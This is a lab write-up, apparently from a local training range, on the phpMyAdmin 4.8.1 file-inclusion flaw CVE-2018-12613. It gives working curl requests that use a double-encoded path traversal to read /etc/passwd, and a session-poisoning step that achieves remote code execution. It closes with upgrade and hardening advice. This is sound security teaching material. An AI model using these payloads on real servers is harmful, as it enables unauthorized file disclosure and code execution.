# phpMyAdmin 4.8.1 Local File Inclusion & Session Code Execution (CVE-2018-12613)

## Overview

CVE-2018-12613 is an authenticated Local File Inclusion (LFI) vulnerability in phpMyAdmin 4.8.0 and 4.8.1. phpMyAdmin is the world's most widely deployed web administration interface for MySQL and MariaDB databases.

The vulnerability resides within `index.php`. To handle internal page routing, phpMyAdmin takes a `target` query parameter and verifies it against an approved whitelist (`$goto_whitelist`) using `in_array()`. However, the whitelist check did not properly validate whether the string contained encoded question mark (`%3f`) or slash delimiters before passing it to `include`. An attacker can supply `target=db_sql.php%253f/../../../../etc/passwd` to bypass the whitelist check and include arbitrary files. Furthermore, because database queries executed by the user are stored in the user's local PHP session file (`/var/lib/php/sessions/sess_<SESSION_ID>`), an attacker can execute a SQL query containing PHP code (`SELECT '<?=phpinfo();?>'`) and include their own session file for full Remote Code Execution.

- **Primary Interface**: `http://localhost:8139`
- **Docker Shortcut**: `./lab start phpmyadmin-lfi`
- **Container Name**: `cyberlab_02_phpmyadmin_lfi`
- **RAM Footprint**: ~150 MB (Apache + PHP + phpMyAdmin 4.8.1)

---

## Exploitation Walkthrough

### 1. Whitelist Bypass via Double URL-Encoding

Verify arbitrary file inclusion by requesting `/etc/passwd`:

```bash
curl -s 'http://localhost:8139/index.php?target=db_sql.php%253f/../../../../../../etc/passwd'
```

The contents of `/etc/passwd` are printed inside the phpMyAdmin HTML wrapper.

### 2. Session Poisoning to Remote Code Execution

1. Log in to phpMyAdmin with any valid credentials or test database account.
2. In the SQL query window, run:
   ```sql
   SELECT "<?php system('id'); ?>";
   ```
3. Retrieve your session cookie value (`phpMyAdmin=SESSION_ID`).
4. Include your session file via LFI:
   ```bash
   curl -s -b "phpMyAdmin=SESSION_ID" \
     "http://localhost:8139/index.php?target=db_sql.php%253f/../../../../../../var/lib/php/sessions/sess_SESSION_ID"
   ```

The PHP code in the session file is executed by the server, outputting `uid=33(www-data)`.

---

## Defensive Remediation & Hardening

1. **Upgrade phpMyAdmin**:
   Upgrade to phpMyAdmin 4.8.2 or newer, which sanitizes `target` parameter values and strips query parameters before whitelist verification.
2. **Restrict Database Management Interfaces**:
   Never expose phpMyAdmin directly to the public internet; place behind an authenticated VPN or bastion tunnel.

---

## Video Walkthroughs & Technical References

- [4 - File Inclusion (LFI/RFI) - Damn Vulnerable Web Application](https://www.youtube.com/watch?v=KY58WcX7OZ4)
- [phpMyAdmin Security Announcement PMASA-2018-4](https://www.phpmyadmin.net/security/PMASA-2018-4/)
- [Vulhub phpMyAdmin CVE-2018-12613 Advisory](https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/)
